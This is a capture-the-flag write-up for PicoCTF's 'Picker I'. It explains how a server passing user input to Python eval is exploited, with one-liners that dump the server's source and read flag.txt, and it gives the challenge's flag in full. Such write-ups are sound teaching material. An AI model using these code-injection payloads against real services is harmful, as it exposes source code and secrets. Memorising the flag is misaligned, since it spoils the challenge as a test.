---
title: "PicoCTF: Picker I"
summary: "Using the eval function? Not good."
date: 2024-09-04
tags: ["picoctf"]
categories: ["write-up", "reverse_engineering"]
draft: false
---
# Investigating the Server
When we connect, we are prompted to input `getRandomNumber`. That works, but what happens if we provide an invalid input?
```
Try entering "getRandomNumber" without the double quotes...
==> getRandomNumber
4

Try entering "getRandomNumber" without the double quotes...
==> 4
'int' object is not callable


```

Providing invalid input shows what looks like a Python error message. This suggests that user input might not be sanitized properly. Let's test if we can provide Python input directly:

```
Try entering "getRandomNumber" without the double quotes...
==> getRandomNumber(123123)
getRandomNumber() takes 0 positional arguments but 1 was given

```

It turns out we can execute Python code! This means that we can now explore the contents of the Python script running on the server.

So, let's try printing the contents of the file with this one liner:
```python3
print(open(__file__).read())
```

And, that outputs the contents of the entire Python script running on the server!

# Investigating the Python File

Parsing through the output, we see this function:
```python3
def win():
  # This line will not work locally unless you create your own 'flag.txt' in
  #   the same directory as this script
  flag = open('flag.txt', 'r').read()
  #flag = flag[:-1]
  flag = flag.strip()
  str_flag = ''
  for c in flag:
    str_flag += str(hex(ord(c))) + ' '
  print(str_flag)

```

Now, we know that `flag.txt` is being read from the Python script. So, we have two choices:
1. Open `flag.txt` using arbitrary Python code
2. Reverse the encryption provided in the `win()` function

## Opening flag.txt Directly
Remember how we read the contents of the servers Python script? Because we know where `flag.txt` is... we can just open the file path directly.

```python3
print(open("flag.txt").read())
```

This outputs the flag: `picoCTF{4_d14m0nd_1n_7h3_r0ugh_ce4b5d5b}`

## Reversing the Encryption

Opening the file directly is too easy! Let's have some fun.

After executing `win()` on the server, we get this returned to us:
```
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x63 0x65 0x34 0x62 0x35 0x64 0x35 0x62 0x7d
```

Remember that `win()` function we discovered in the Python file? It converted each character of the flag into the hex representation of the character's unicode value (`ord(c)`):

```python3
...
for c in flag:
    str_flag += str(hex(ord(c))) + ' '
```

We simply just need to reverse the operations provided in the above code snippet.

```python3
# list comprehensions are super, super nice to know.
# https://www.programiz.com/python-programming/list-comprehension

# hex string from win() output
starting_flag = "0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x63 0x65 0x34 0x62 0x35 0x64 0x35 0x62 0x7d"

# split the string into individual hex codes
split_flag = starting_flag.split(" ")

# convert each hex code back its original character
transformed_flag = "".join(chr(int(word, 16)) for word in split_flag)

print(transformed_flag) # picoCTF{4_d14m0nd_1n_7h3_r0ugh_ce4b5d5b}
```
